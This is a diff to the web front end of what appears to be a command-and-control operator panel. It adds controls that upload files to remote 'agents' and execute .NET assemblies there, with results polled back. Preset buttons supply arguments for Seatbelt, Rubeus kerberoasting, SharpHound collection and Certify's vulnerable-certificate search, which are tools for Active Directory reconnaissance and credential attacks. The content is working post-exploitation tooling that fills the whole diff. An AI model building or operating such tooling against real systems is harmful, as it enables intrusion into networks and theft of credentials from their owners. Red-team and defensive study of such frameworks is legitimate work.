@@ -543,6 +543,42 @@ tr.clickable { cursor: pointer; }
           <input class="term-input" id="term-input" placeholder="Type a command..." onkeydown="if(event.key==='Enter')sendTermCmd()" autofocus>
         </div>
       </div>
+
+      <!-- .NET Assembly Quick Execute (below terminal) -->
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px">
+        <div class="card">
+          <div class="card-header"><h3><span>⚡</span> Upload & Execute .NET Assembly</h3></div>
+          <div class="card-body padded">
+            <input type="file" id="term-asm-file" style="display:none" accept=".exe,.dll" onchange="termAsmFileSelected(this)">
+            <div style="padding:12px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer;margin-bottom:8px" onclick="document.getElementById('term-asm-file').click()" id="term-asm-dropzone">
+              <span style="font-size:11px;color:var(--text-muted)">Click to select .NET assembly (.exe/.dll)</span>
+            </div>
+            <div style="display:flex;gap:6px">
+              <input id="term-asm-args" placeholder="Arguments (e.g. -group=all)" style="flex:1;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+              <button class="btn" onclick="termExecuteAssembly()" style="padding:7px 16px;font-size:12px">⚡ Run</button>
+            </div>
+            <div style="display:flex;flex-wrap:wrap;gap:4px;margin-top:8px">
+              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-group=all'" style="font-size:9px;padding:3px 8px">Seatbelt -group=all</button>
+              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='kerberoast'" style="font-size:9px;padding:3px 8px">Rubeus kerberoast</button>
+              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='-c All'" style="font-size:9px;padding:3px 8px">SharpHound -c All</button>
+              <button class="qbtn" onclick="document.getElementById('term-asm-args').value='find /vulnerable'" style="font-size:9px;padding:3px 8px">Certify vulnerable</button>
+            </div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><h3><span>📤</span> Upload File to Agent</h3></div>
+          <div class="card-body padded">
+            <input type="file" id="term-upload-file" style="display:none" onchange="termUploadFileSelected(this)">
+            <div style="padding:12px;border:2px dashed var(--border);border-radius:var(--radius);text-align:center;cursor:pointer;margin-bottom:8px" onclick="document.getElementById('term-upload-file').click()" id="term-upload-dropzone">
+              <span style="font-size:11px;color:var(--text-muted)">Click to select file to upload</span>
+            </div>
+            <div style="display:flex;gap:6px">
+              <input id="term-upload-path" placeholder="Remote path (auto if empty)" style="flex:1;padding:7px 10px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:12px;font-family:monospace">
+              <button class="btn" onclick="termUploadFile()" style="padding:7px 16px;font-size:12px">📤 Upload</button>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- ══════ PAYLOADS ══════ -->
@@ -2694,7 +2730,104 @@ function saveEngagementNotes() {
   }
 }
 
-// ──── .NET Assembly Execution ────
+// ──── Terminal Assembly & Upload (below terminal) ────
+function termAsmFileSelected(input) {
+  var dz = document.getElementById('term-asm-dropzone');
+  if (input.files && input.files[0]) {
+    dz.innerHTML = '<span style="color:#10b981">⚡ ' + input.files[0].name + ' (' + Math.round(input.files[0].size/1024) + 'KB)</span>';
+  }
+}
+
+function termUploadFileSelected(input) {
+  var dz = document.getElementById('term-upload-dropzone');
+  if (input.files && input.files[0]) {
+    dz.innerHTML = '<span style="color:#10b981">📄 ' + input.files[0].name + ' (' + Math.round(input.files[0].size/1024) + 'KB)</span>';
+  }
+}
+
+async function termExecuteAssembly() {
+  var agent = document.getElementById('agent-select').value;
+  var fileInput = document.getElementById('term-asm-file');
+  var args = document.getElementById('term-asm-args').value.trim();
+
+  if (!agent) { termLog('error', '✗ Select an agent first'); return; }
+  if (!fileInput || !fileInput.files || !fileInput.files[0]) { termLog('error', '✗ Select a .NET assembly file first'); return; }
+
+  var file = fileInput.files[0];
+  var remotePath = 'C:\\Users\\Public\\' + file.name;
+
+  termLog('system', '⚡ Uploading ' + file.name + ' (' + Math.round(file.size/1024) + 'KB) to ' + agent + '...');
+
+  // Upload
+  var formData = new FormData();
+  formData.append('agent', agent);
+  formData.append('file', file);
+  formData.append('remote_path', remotePath);
+
+  try {
+    var resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
+    var data = await resp.json();
+    if (data.error) { termLog('error', '✗ Upload failed: ' + data.error); return; }
+    termLog('success', '✓ Uploaded to ' + remotePath);
+  } catch(e) { termLog('error', '✗ Upload error: ' + e.message); return; }
+
+  // Execute
+  termLog('system', '⚡ Executing: assembly ' + remotePath + ' ' + args);
+  var cmdArgs = remotePath + (args ? ' ' + args : '');
+  try {
+    var resp2 = await fetch('/api/cmd', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent:agent, command:'assembly', args:cmdArgs})});
+    var data2 = await resp2.json();
+    if (data2.error) { termLog('error', '✗ ' + data2.error); return; }
+    termLog('success', '✓ Assembly task queued (ID: ' + data2.task_id.substring(0,8) + ') — waiting for agent check-in...');
+
+    // Poll for result
+    for (var i = 0; i < 15; i++) {
+      await new Promise(function(r) { setTimeout(r, 4000); });
+      var detail = await fetchJ('/api/agent/' + agent);
+      if (detail.tasks) {
+        for (var t = 0; t < detail.tasks.length; t++) {
+          var task = detail.tasks[t];
+          if (data2.task_id.startsWith(task.id) || task.id.startsWith(data2.task_id.substring(0,8))) {
+            if (task.status !== 'pending' && task.status !== 'sent') {
+              if (task.output) { termLog('output', task.output); }
+              if (task.error) { termLog('error', task.error); }
+              return;
+            }
+          }
+        }
+      }
+    }
+    termLog('info', 'Timeout — check agent task history');
+  } catch(e) { termLog('error', '✗ ' + e.message); }
+}
+
+async function termUploadFile() {
+  var agent = document.getElementById('agent-select').value;
+  var fileInput = document.getElementById('term-upload-file');
+  var remotePath = document.getElementById('term-upload-path').value.trim();
+
+  if (!agent) { termLog('error', '✗ Select an agent first'); return; }
+  if (!fileInput || !fileInput.files || !fileInput.files[0]) { termLog('error', '✗ Select a file first'); return; }
+
+  var file = fileInput.files[0];
+  if (!remotePath) { remotePath = 'C:\\Users\\Public\\' + file.name; }
+
+  termLog('system', '📤 Uploading ' + file.name + ' → ' + remotePath);
+
+  var formData = new FormData();
+  formData.append('agent', agent);
+  formData.append('file', file);
+  formData.append('remote_path', remotePath);
+
+  try {
+    var resp = await fetch('/api/upload-to-agent', {method:'POST', body:formData});
+    var data = await resp.json();
+    if (data.error) { termLog('error', '✗ ' + data.error); return; }
+    termLog('success', '✓ Upload queued: ' + remotePath + ' (' + data.size + ' bytes, task: ' + data.task_id.substring(0,8) + ')');
+  } catch(e) { termLog('error', '✗ ' + e.message); }
+}
+
+// ──── .NET Assembly Execution (Settings page — kept for backward compat) ────
 function asmFileSelected(input) {
   var dz = document.getElementById('asm-dropzone');
   if (input.files && input.files[0]) {
